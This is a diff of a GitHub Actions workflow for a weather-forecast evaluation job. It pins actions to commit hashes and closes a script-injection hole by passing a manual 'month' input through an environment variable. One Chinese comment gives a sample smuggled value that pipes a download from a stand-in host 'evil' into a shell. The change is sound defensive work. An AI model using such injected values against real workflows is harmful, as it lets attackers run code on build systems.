@@ -31,13 +31,13 @@ jobs:
       PYTHONPATH: ${{ github.workspace }}/src
     steps:
       - name: 检出
-        uses: actions/checkout@v4
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262  # v4
 
       - name: 配置 Python 3.12.6
         # cyeva 0.2.3 在 Python 3.12 上可用；但其元数据错误地把 pint 钉死为 ==0.24.3，
         # 而 pint 0.24.3 在 3.12+ 上因 dataclass 问题无法导入。故用 --no-deps 单独安装
         # cyeva，再由 requirements.txt 提供兼容的 pint==0.24.4（见该文件顶部说明）。
-        uses: actions/setup-python@v5
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5
         with:
           python-version: "3.12.6"
           cache: pip
@@ -203,8 +203,14 @@ jobs:
            (github.event_name == 'schedule' && steps.bj.outputs.day == '01'))
         env:
           TZ: Asia/Shanghai
-        run: python -m weather_eval monthly ${{
-          github.event.inputs.month != '' && format('--month {0}', github.event.inputs.month) || '' }}
+          # 输入一律经 env 传给 shell，绝不直接插进 run:（审查 P2-8）。
+          # GitHub 官方把 "${{ github.event.inputs.x }}" 写进 run: 列为注入反模式：
+          # 表达式在 shell 解析**之前**就已被展开，于是
+          # month="x; curl evil|sh" 会先被 shell 当命令执行，Python 侧的正则
+          # 校验根本来不及拦。经 env 传递后，值在 shell 里只是变量内容，
+          # 再配合下面的双引号引用，注入面从"命令"降为"字符串"。
+          MONTH: ${{ github.event.inputs.month }}
+        run: python -m weather_eval monthly ${MONTH:+--month "$MONTH"}
 
       - name: 数据体积治理（月度冻结 + 超期出仓）
         # 起报快照是只增不减的证据流（约 170 份/天、2.8 MB/天、一年 ≈ 6 万文件）。
@@ -247,7 +253,7 @@ jobs:
         # 预报快照不可追补（观测可下轮回看补抓，预报快照错过即永久缺失），
         # 必须把当轮已落盘的数据提交入库；失败信号由作业状态本身保留。
         if: always()
-        uses: stefanzweifel/git-auto-commit-action@v5
+        uses: stefanzweifel/git-auto-commit-action@b863ae1933cb653a53c021fe36dbb774e1fb9403  # v5
         with:
           commit_message: "chore: 自动评测数据更新"
           file_pattern: "data reports"
@@ -359,11 +365,11 @@ jobs:
 
       - name: 上传 Pages 产物
         if: always()
-        uses: actions/upload-pages-artifact@v3
+        uses: actions/upload-pages-artifact@56afc609e74202658d3ffba0e8f6dda462b719fa  # v3
         with:
           path: reports
 
       - name: 部署 GitHub Pages
         if: always()
         id: deploy
-        uses: actions/deploy-pages@v4
+        uses: actions/deploy-pages@d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e  # v4
